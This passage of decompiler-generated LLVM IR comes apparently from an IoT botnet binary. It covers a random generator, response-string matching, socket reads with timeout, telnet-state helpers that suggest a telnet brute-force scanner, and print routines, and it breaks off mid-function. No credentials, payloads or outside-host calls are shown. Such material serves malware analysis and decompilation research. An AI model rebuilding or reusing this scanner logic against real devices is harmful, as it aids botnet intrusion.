dec_label_pc_837c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_83c0, %dec_label_pc_837c ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_838c = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_29928.26 to i32), i32 -12)
  %v6_838c = inttoptr i32 %v5_838c to i32*
  %v7_838c = load i32, i32* %v6_838c, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_839c = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_29928.26 to i32), i32 -8)
  %v6_839c = inttoptr i32 %v5_839c to i32*
  %v7_839c = load i32, i32* %v6_839c, align 4
  %v2_83a0 = xor i32 %storemerge12, -1640531527
  %v2_83a8 = xor i32 %v2_83a0, %v7_838c
  %v2_83b0 = xor i32 %v2_83a8, %v7_839c
  %v5_83b8 = mul nuw nsw i32 %storemerge12, 4
  %v6_83b8 = add i32 %v5_83b8, ptrtoint (i32* @global_var_29928.26 to i32)
  %v7_83b8 = inttoptr i32 %v6_83b8 to i32*
  store i32 %v2_83b0, i32* %v7_83b8, align 4
  %v1_83c0 = add nuw nsw i32 %storemerge12, 1
  %v7_83d8 = icmp slt i32 %v1_83c0, 4096
  br i1 %v7_83d8, label %dec_label_pc_837c, label %dec_label_pc_83dc

dec_label_pc_83dc:                                ; preds = %dec_label_pc_837c
  %v9_83e0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_83e0

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_837c, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83ec = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83ec, i32* @ip, align 4
  %v2_841c = load i32, i32* @global_var_2958c.31, align 4
  %v1_8420 = add i32 %v2_841c, 1
  %v3_8428 = urem i32 %v1_8420, 4096
  store i32 %v3_8428, i32* @global_var_2958c.31, align 4
  %v4_8440 = mul nuw nsw i32 %v3_8428, 4
  %v5_8440 = add i32 %v4_8440, ptrtoint (i32* @global_var_29928.26 to i32)
  %v6_8440 = inttoptr i32 %v5_8440 to i32*
  %v7_8440 = load i32, i32* %v6_8440, align 4
  %v2_8458 = mul i32 %v7_8440, 18782
  store i32 %v2_8458, i32* %r1.global-to-local, align 4
  %v2_8470 = load i32, i32* @global_var_29588.34, align 4
  %v2_8478 = add i32 %v2_8470, %v2_8458
  %v3_8478 = icmp ult i32 %v2_8478, %v2_8470
  %v4_847c = zext i1 %v3_8478 to i32
  %v2_84ac = add i32 %v4_847c, %v2_8478
  %v3_84c0 = icmp ult i32 %v2_84ac, %v4_847c
  br i1 %v3_84c0, label %dec_label_pc_84c8, label %dec_label_pc_84e8

dec_label_pc_84c8:                                ; preds = %entry
  %v1_84cc = add i32 %v2_84ac, 1
  %v1_84dc = select i1 %v3_8478, i32 2, i32 1
  br label %dec_label_pc_84e8

dec_label_pc_84e8:                                ; preds = %entry, %dec_label_pc_84c8
  %storemerge = phi i32 [ %v1_84dc, %dec_label_pc_84c8 ], [ %v4_847c, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_84cc, %dec_label_pc_84c8 ], [ %v2_84ac, %entry ]
  store i32 %storemerge, i32* @global_var_29588.34, align 4
  store i32 %v3_8428, i32* %r1.global-to-local, align 4
  %v2_84f8 = sub i32 -2, %stack_var_-28.0
  store i32 %v2_84f8, i32* %v6_8440, align 4
  %v1_8508 = load i32, i32* %r1.global-to-local, align 4
  %v4_8508 = mul i32 %v1_8508, 4
  %v5_8508 = add i32 %v4_8508, ptrtoint (i32* @global_var_29928.26 to i32)
  %v6_8508 = inttoptr i32 %v5_8508 to i32*
  %v7_8508 = load i32, i32* %v6_8508, align 4
  ret i32 %v7_8508

; uselistorder directives
  uselistorder i32 %v4_847c, { 0, 2, 1 }
  uselistorder i32 %v2_8470, { 1, 0 }
  uselistorder i32 %v3_8428, { 2, 1, 0 }
  uselistorder i32* @global_var_29928.26, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_29928.26 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_84e8, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %dec_label_pc_8554, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8558, %dec_label_pc_8554 ]
  %v1_8558 = add i32 %stack_var_-24.0, 1
  %v3_8564 = mul i32 %v1_8558, 4
  %v2_8570 = add i32 %v3_8564, %arg2
  %v1_8574 = inttoptr i32 %v2_8570 to i32*
  %v2_8574 = load i32, i32* %v1_8574, align 4
  %v2_8578 = icmp eq i32 %v2_8574, 0
  br i1 %v2_8578, label %dec_label_pc_85d4.preheader, label %dec_label_pc_8554

dec_label_pc_85d4.preheader:                      ; preds = %dec_label_pc_8554
  %v3_85ac = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_85d4

dec_label_pc_858c:                                ; preds = %dec_label_pc_85d4
  %v3_8590 = mul i32 %storemerge2, 4
  %v2_859c = add i32 %v3_8590, %arg2
  %v1_85a0 = inttoptr i32 %v2_859c to i32*
  %v2_85a0 = load i32, i32* %v1_85a0, align 4
  %v4_85ac = call i32 @strcasestr(i8* %v3_85ac, i32 %v2_85a0, i32 %v3_8590)
  %v2_85b4 = icmp eq i32 %v4_85ac, 0
  %v1_85cc = add nuw i32 %storemerge2, 1
  br i1 %v2_85b4, label %dec_label_pc_85d4, label %dec_label_pc_85ec

dec_label_pc_85d4:                                ; preds = %dec_label_pc_858c, %dec_label_pc_85d4.preheader
  %storemerge2 = phi i32 [ %v1_85cc, %dec_label_pc_858c ], [ 0, %dec_label_pc_85d4.preheader ]
  %v5_85e0 = icmp slt i32 %storemerge2, %v1_8558
  br i1 %v5_85e0, label %dec_label_pc_858c, label %dec_label_pc_85ec

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85d4, %dec_label_pc_858c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_858c ], [ 0, %dec_label_pc_85d4 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_8558, { 1, 0, 2 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8600 = load i32, i32* @fp, align 4
  %v3_8618 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([5 x i8*]* @global_var_290c4.41 to i32))
  store i32 %v3_8600, i32* @fp, align 4
  ret i32 %v3_8618
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8630 = load i32, i32* @fp, align 4
  %v3_8648 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_290a4.50 to i32))
  store i32 %v3_8630, i32* @fp, align 4
  ret i32 %v3_8648
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 34408, i32* %stack_var_-4, align 4
  %v2_8664 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8664, i32* @fp, align 4
  %v1_8674 = call i32 @contains_success(i32 %arg1)
  %v2_867c = icmp eq i32 %v1_8674, 0
  br i1 %v2_867c, label %dec_label_pc_8684, label %dec_label_pc_86ac

dec_label_pc_8684:                                ; preds = %entry
  %v1_8688 = call i32 @contains_fail(i32 %arg1)
  %v2_8690 = icmp ne i32 %v1_8688, 0
  %. = zext i1 %v2_8690 to i32
  br label %dec_label_pc_86ac

dec_label_pc_86ac:                                ; preds = %dec_label_pc_8684, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_8684 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8700.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_86c0 = load i32, i32* @fp, align 4
  store i32 %v3_86c0, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_86ec = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_8700

dec_label_pc_8700:                                ; preds = %dec_label_pc_8700.lr.ph, %dec_label_pc_8700
  %storemerge25 = phi i32 [ 0, %dec_label_pc_8700.lr.ph ], [ %v1_8714, %dec_label_pc_8700 ]
  %v5_870c = mul nuw nsw i32 %storemerge25, 4
  %v6_870c = add i32 %v5_870c, %v2_86ec
  %v7_870c = inttoptr i32 %v6_870c to i32*
  store i32 0, i32* %v7_870c, align 4
  %v1_8714 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_8714, 32
  br i1 %tmp21, label %dec_label_pc_8700, label %dec_label_pc_8728

dec_label_pc_8728:                                ; preds = %dec_label_pc_8700
  %v13_86c0 = ptrtoint i32* %stack_var_-16 to i32
  %v3_872c = udiv i32 %arg1, 32
  %v3_8738 = mul nuw nsw i32 %v3_872c, 4
  %v2_8740 = add nsw i32 %v3_8738, -136
  %v2_8744 = add i32 %v2_8740, %v13_86c0
  %v1_8748 = inttoptr i32 %v2_8744 to i32*
  %v2_8748 = load i32, i32* %v1_8748, align 4
  %v1_8750 = urem i32 %arg1, 32
  %v6_8758 = shl i32 1, %v1_8750
  %v2_875c = or i32 %v2_8748, %v6_8758
  store i32 %v2_875c, i32* %v1_8748, align 4
  %v1_877c = add i32 %arg1, 1
  %v2_8784 = ptrtoint i32* %stack_var_-160 to i32
  %v5_8798 = call i32 @__libc_select(i32 %v1_877c, i32 %v2_86ec, i32 0, i32 0, i32 %v2_8784)
  %v5_87a4 = icmp sgt i32 %v5_8798, 0
  br i1 %v5_87a4, label %dec_label_pc_87b4, label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8728
  br label %dec_label_pc_87d4

dec_label_pc_87b4:                                ; preds = %dec_label_pc_8728
  %v4_87c8 = inttoptr i32 %arg3 to i32*
  %v5_87c8 = call i32 @__libc_recv(i32 %arg1, i32* %v4_87c8, i32 %arg4, i32 0)
  br label %dec_label_pc_87d4

dec_label_pc_87d4:                                ; preds = %dec_label_pc_87a8, %dec_label_pc_87b4
  %storemerge = phi i32 [ %v5_87c8, %dec_label_pc_87b4 ], [ 0, %dec_label_pc_87a8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_86ec, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_87d4, { 1, 0 }
  uselistorder label %dec_label_pc_8700, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_87e8 = load i32, i32* @fp, align 4
  store i32 34800, i32* %stack_var_-4, align 4
  %v2_87ec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_87ec, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_8814 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_8828 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_8838 = load i8, i8* %arg3, align 1
  %v2_883c = icmp eq i8 %v2_8838, -1
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_8854

dec_label_pc_8844:                                ; preds = %entry
  %v3_8838 = zext i8 %v2_8838 to i32
  %v6_8850 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_8838, i32 %v5_8828)
  br label %dec_label_pc_8854

dec_label_pc_8854:                                ; preds = %entry, %dec_label_pc_8844
  %v3_8858 = load i32, i32* %stack_var_0, align 4
  %v3_885c = call i32 @contains_string(i32 %tmp, i32 %v3_8858)
  %v2_8864 = icmp ne i32 %v3_885c, 0
  %. = zext i1 %v2_8864 to i32
  store i32 %v3_87e8, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_8838, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8854, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_8894 = load i32, i32* @fp, align 4
  %v1_88a8 = add i32 %arg1, 4
  %v2_88a8 = inttoptr i32 %v1_88a8 to i32*
  %v3_88a8 = load i32, i32* %v2_88a8, align 4
  store i32 %v3_88a8, i32* @r0, align 4
  %v1_88b4 = call i32 @__GI_inet_ntoa(i32 %v3_88a8)
  store i32 %v3_8894, i32* @fp, align 4
  ret i32 %v1_88b4
}

define i32 @advance_telstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_88e4 = icmp eq i32 %arg2, 0
  br i1 %v2_88e4, label %dec_label_pc_88ec, label %dec_label_pc_88fc

dec_label_pc_88ec:                                ; preds = %entry
  %v2_88f0 = load i32, i32* %arg1, align 4
  %v1_88f8 = call i32 @__libc_close(i32 %v2_88f0)
  br label %dec_label_pc_88fc

dec_label_pc_88fc:                                ; preds = %entry, %dec_label_pc_88ec
  %v2_8904 = add i32 %tmp, 16
  %v3_8904 = inttoptr i32 %v2_8904 to i32*
  store i32 0, i32* %v3_8904, align 4
  %v3_8908 = load i32, i32* %stack_var_-24, align 4
  %v1_8914 = trunc i32 %v3_8908 to i8
  %v3_8914 = add i32 %tmp, 8
  %v4_8914 = inttoptr i32 %v3_8914 to i8*
  store i8 %v1_8914, i8* %v4_8914, align 1
  %v1_891c = add i32 %tmp, 24
  %v2_891c = inttoptr i32 %v1_891c to i32*
  %v3_891c = load i32, i32* %v2_891c, align 4
  store i32 1024, i32* @r2, align 4
  %v2_892c = inttoptr i32 %v3_891c to i8*
  %v3_892c = call i32 @__GI_memset(i8* %v2_892c, i32 0)
  ret i32 %v3_892c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_88fc, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8954 = inttoptr i32 %arg1 to i32*
  %v3_8954 = call i32 @advance_telstate(i32* %v2_8954, i32 0)
  %v3_8960 = add i32 %arg1, 9
  %v4_8960 = inttoptr i32 %v3_8960 to i8*
  store i8 1, i8* %v4_8960, align 1
  ret i32 %v3_8954
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8968 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8968, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8988 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8988, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_89a8

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89a8, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_89a0, %dec_label_pc_89a8 ]
  %v3_89b0 = load i8*, i8** %stack_var_-32, align 4
  %v4_89b0 = ptrtoint i8* %v3_89b0 to i32
  %v2_89b4 = add i32 %v4_89b0, %stack_var_-24.0
  %v1_89b8 = inttoptr i32 %v2_89b4 to i8*
  %v2_89b8 = load i8, i8* %v1_89b8, align 1
  %v3_89b8 = zext i8 %v2_89b8 to i32
  store i32 %v3_89b8, i32* %r0.global-to-local, align 4
  %v1_89c0 = call i32 @isspace(i32 %v3_89b8)
  store i32 %v1_89c0, i32* %r0.global-to-local, align 4
  %v2_89c8 = icmp eq i32 %v1_89c0, 0
  %v1_89a0 = add i32 %stack_var_-24.0, 1
  br i1 %v2_89c8, label %dec_label_pc_89e0.preheader, label %dec_label_pc_89a8

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_89a8
  %v1_8990 = add i32 %v3_8988, -1
  %v5_89ec10 = icmp slt i32 %v1_8990, %stack_var_-24.0
  br i1 %v5_89ec10, label %dec_label_pc_8a60.preheader, label %dec_label_pc_89f0

dec_label_pc_89d4:                                ; preds = %dec_label_pc_89f0
  %v1_89d8 = add i32 %stack_var_-20.011, -1
  %v5_89ec = icmp slt i32 %v1_89d8, %stack_var_-24.0
  br i1 %v5_89ec, label %dec_label_pc_8a60.preheader, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89d4
  %stack_var_-20.011 = phi i32 [ %v1_89d8, %dec_label_pc_89d4 ], [ %v1_8990, %dec_label_pc_89e0.preheader ]
  %v3_89f8 = load i8*, i8** %stack_var_-32, align 4
  %v4_89f8 = ptrtoint i8* %v3_89f8 to i32
  %v2_89fc = add i32 %v4_89f8, %stack_var_-20.011
  %v1_8a00 = inttoptr i32 %v2_89fc to i8*
  %v2_8a00 = load i8, i8* %v1_8a00, align 1
  %v3_8a00 = zext i8 %v2_8a00 to i32
  store i32 %v3_8a00, i32* %r0.global-to-local, align 4
  %v1_8a08 = call i32 @isspace(i32 %v3_8a00)
  store i32 %v1_8a08, i32* %r0.global-to-local, align 4
  %v2_8a10 = icmp eq i32 %v1_8a08, 0
  br i1 %v2_8a10, label %dec_label_pc_8a60.preheader, label %dec_label_pc_89d4

dec_label_pc_8a60.preheader:                      ; preds = %dec_label_pc_89d4, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8990, %dec_label_pc_89e0.preheader ], [ %v1_89d8, %dec_label_pc_89d4 ], [ %stack_var_-20.011, %dec_label_pc_89f0 ]
  br label %dec_label_pc_8a60

dec_label_pc_8a24:                                ; preds = %dec_label_pc_8a60
  %v2_8a48 = add i32 %v4_8a80, %storemerge1
  %v1_8a4c = inttoptr i32 %v2_8a48 to i8*
  %v2_8a4c = load i8, i8* %v1_8a4c, align 1
  %v3_8a50 = inttoptr i32 %v2_8a84 to i8*
  store i8 %v2_8a4c, i8* %v3_8a50, align 1
  %v1_8a58 = add i32 %storemerge1, 1
  br label %dec_label_pc_8a60

dec_label_pc_8a60:                                ; preds = %dec_label_pc_8a60.preheader, %dec_label_pc_8a24
  %storemerge1 = phi i32 [ %v1_8a58, %dec_label_pc_8a24 ], [ %stack_var_-24.0, %dec_label_pc_8a60.preheader ]
  %v7_8a6c = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_8a78 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_8a80 = load i8*, i8** %stack_var_-32, align 4
  %v4_8a80 = ptrtoint i8* %v3_8a80 to i32
  %v2_8a84 = add i32 %v4_8a80, %v2_8a78
  br i1 %v7_8a6c, label %dec_label_pc_8a70, label %dec_label_pc_8a24

dec_label_pc_8a70:                                ; preds = %dec_label_pc_8a60
  %v3_8a8c = inttoptr i32 %v2_8a84 to i8*
  store i8 0, i8* %v3_8a8c, align 1
  %v9_8a94 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8a94

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8990, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a60, { 1, 0 }
  uselistorder label %dec_label_pc_8a60.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8a98 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8a98, i32* @ip, align 4
  %v0_8aa8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8ab4 = icmp eq i32 %v0_8aa8, 0
  br i1 %v2_8ab4, label %dec_label_pc_8ae8, label %dec_label_pc_8abc

dec_label_pc_8abc:                                ; preds = %entry
  %v1_8ac0 = inttoptr i32 %v0_8aa8 to i32*
  %v2_8ac0 = load i32, i32* %v1_8ac0, align 4
  %v1_8acc = trunc i32 %arg2 to i8
  %v3_8acc = inttoptr i32 %v2_8ac0 to i8*
  store i8 %v1_8acc, i8* %v3_8acc, align 1
  %v2_8ad4 = load i32, i32* %v1_8ac0, align 4
  %v1_8ad8 = add i32 %v2_8ad4, 1
  store i32 %v1_8ad8, i32* %v1_8ac0, align 4
  %v9_8b00.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8afc

dec_label_pc_8ae8:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8af8 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8af8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8afc

dec_label_pc_8afc:                                ; preds = %dec_label_pc_8abc, %dec_label_pc_8ae8
  %v9_8b00 = phi i32 [ %v9_8b00.pre, %dec_label_pc_8abc ], [ %v3_8af8, %dec_label_pc_8ae8 ]
  ret i32 %v9_8b00

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8afc, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8b04 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8b04, i32* @ip, align 4
  %v3_8b08 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp43 = icmp slt i32 %arg3, 1
  br i1 %tmp43, label %dec_label_pc_8bc0, label %dec_label_pc_8b40

dec_label_pc_8b40:                                ; preds = %entry
  %v2_8b7020 = load i8, i8* %arg2, align 1
  %v2_8b7422 = icmp eq i8 %v2_8b7020, 0
  br i1 %v2_8b7422, label %dec_label_pc_8b7c, label %dec_label_pc_8b54

dec_label_pc_8b54:                                ; preds = %dec_label_pc_8b40, %dec_label_pc_8b54
  %v4_8b6c24 = phi i32 [ %v1_8b64, %dec_label_pc_8b54 ], [ %tmp, %dec_label_pc_8b40 ]
  %stack_var_-40.023 = phi i32 [ %v1_8b58, %dec_label_pc_8b54 ], [ 0, %dec_label_pc_8b40 ]
  %v1_8b58 = add i32 %stack_var_-40.023, 1
  %v1_8b64 = add i32 %v4_8b6c24, 1
  %v5_8b68 = inttoptr i32 %v1_8b64 to i8*
  %v2_8b70 = load i8, i8* %v5_8b68, align 1
  %v2_8b74 = icmp eq i8 %v2_8b70, 0
  br i1 %v2_8b74, label %dec_label_pc_8b7c, label %dec_label_pc_8b54

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b54, %dec_label_pc_8b40
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_8b40 ], [ %v1_8b58, %dec_label_pc_8b54 ]
  %v5_8b88 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8b88, label %dec_label_pc_8b98, label %dec_label_pc_8ba8

dec_label_pc_8b98:                                ; preds = %dec_label_pc_8b7c
  %v2_8ba0 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8ba8

dec_label_pc_8ba8:                                ; preds = %dec_label_pc_8b7c, %dec_label_pc_8b98
  %storemerge4 = phi i32 [ %v2_8ba0, %dec_label_pc_8b98 ], [ 0, %dec_label_pc_8b7c ]
  %v1_8bac = and i32 %arg4, 2
  %v2_8bb0 = icmp eq i32 %v1_8bac, 0
  br i1 %v2_8bb0, label %dec_label_pc_8bc0, label %dec_label_pc_8bb8

dec_label_pc_8bb8:                                ; preds = %dec_label_pc_8ba8
  br label %dec_label_pc_8bc0

dec_label_pc_8bc0:                                ; preds = %dec_label_pc_8ba8, %entry, %dec_label_pc_8bb8
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_8ba8 ], [ %storemerge4, %dec_label_pc_8bb8 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8ba8 ], [ 48, %dec_label_pc_8bb8 ]
  %v1_8bc4 = urem i32 %arg4, 2
  %v2_8bc8 = icmp eq i32 %v1_8bc4, 0
  br i1 %v2_8bc8, label %dec_label_pc_8bf8.preheader, label %dec_label_pc_8c34.preheader

dec_label_pc_8bf8.preheader:                      ; preds = %dec_label_pc_8bc0
  %v5_8c0017 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_8c0017, label %dec_label_pc_8bd4.lr.ph, label %dec_label_pc_8c34.preheader

dec_label_pc_8bd4.lr.ph:                          ; preds = %dec_label_pc_8bf8.preheader
  %v2_8bdc = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8bd4

dec_label_pc_8bd4:                                ; preds = %dec_label_pc_8bd4.lr.ph, %dec_label_pc_8bd4
  %stack_var_-28.118 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8bd4.lr.ph ], [ %v1_8bf0, %dec_label_pc_8bd4 ]
  %v3_8bdc = call i32 @printchar(i32* %v2_8bdc, i32 %stack_var_-44.0)
  %v3_8be0 = load i32, i32* %stack_var_-48, align 4
  %v1_8be4 = add i32 %v3_8be0, 1
  store i32 %v1_8be4, i32* %stack_var_-48, align 4
  %v1_8bf0 = add nsw i32 %stack_var_-28.118, -1
  %v5_8c00 = icmp sgt i32 %stack_var_-28.118, 1
  br i1 %v5_8c00, label %dec_label_pc_8bd4, label %dec_label_pc_8c34.preheader

dec_label_pc_8c34.preheader:                      ; preds = %dec_label_pc_8bd4, %dec_label_pc_8bf8.preheader, %dec_label_pc_8bc0
  %v3_8c7828 = phi i32 [ 0, %dec_label_pc_8bc0 ], [ 0, %dec_label_pc_8bf8.preheader ], [ %v1_8be4, %dec_label_pc_8bd4 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8bc0 ], [ %stack_var_-28.0, %dec_label_pc_8bf8.preheader ], [ 0, %dec_label_pc_8bd4 ]
  %v2_8c3810 = load i8, i8* %arg2, align 1
  %v2_8c3c12 = icmp eq i8 %v2_8c3810, 0
  br i1 %v2_8c3c12, label %dec_label_pc_8c6c.preheader, label %dec_label_pc_8c08.lr.ph

dec_label_pc_8c08.lr.ph:                          ; preds = %dec_label_pc_8c34.preheader
  %v2_8c18 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8c08

dec_label_pc_8c08:                                ; preds = %dec_label_pc_8c08.lr.ph, %dec_label_pc_8c08
  %v4_8c3414 = phi i32 [ %tmp, %dec_label_pc_8c08.lr.ph ], [ %v1_8c2c, %dec_label_pc_8c08 ]
  %stack_var_-24.013 = phi i8* [ %arg2, %dec_label_pc_8c08.lr.ph ], [ %v5_8c30, %dec_label_pc_8c08 ]
  %v2_8c0c = load i8, i8* %stack_var_-24.013, align 1
  %v3_8c0c = zext i8 %v2_8c0c to i32
  %v3_8c18 = call i32 @printchar(i32* %v2_8c18, i32 %v3_8c0c)
  %v3_8c1c = load i32, i32* %stack_var_-48, align 4
  %v1_8c20 = add i32 %v3_8c1c, 1
  store i32 %v1_8c20, i32* %stack_var_-48, align 4
  %v1_8c2c = add i32 %v4_8c3414, 1
  %v5_8c30 = inttoptr i32 %v1_8c2c to i8*
  %v2_8c38 = load i8, i8* %v5_8c30, align 1
  %v2_8c3c = icmp eq i8 %v2_8c38, 0
  br i1 %v2_8c3c, label %dec_label_pc_8c6c.preheader, label %dec_label_pc_8c08

dec_label_pc_8c6c.preheader:                      ; preds = %dec_label_pc_8c08, %dec_label_pc_8c34.preheader
  %v3_8c7827 = phi i32 [ %v3_8c7828, %dec_label_pc_8c34.preheader ], [ %v1_8c20, %dec_label_pc_8c08 ]
  %v5_8c747 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_8c747, label %dec_label_pc_8c48.lr.ph, label %dec_label_pc_8c78

dec_label_pc_8c48.lr.ph:                          ; preds = %dec_label_pc_8c6c.preheader
  %v2_8c50 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8c48

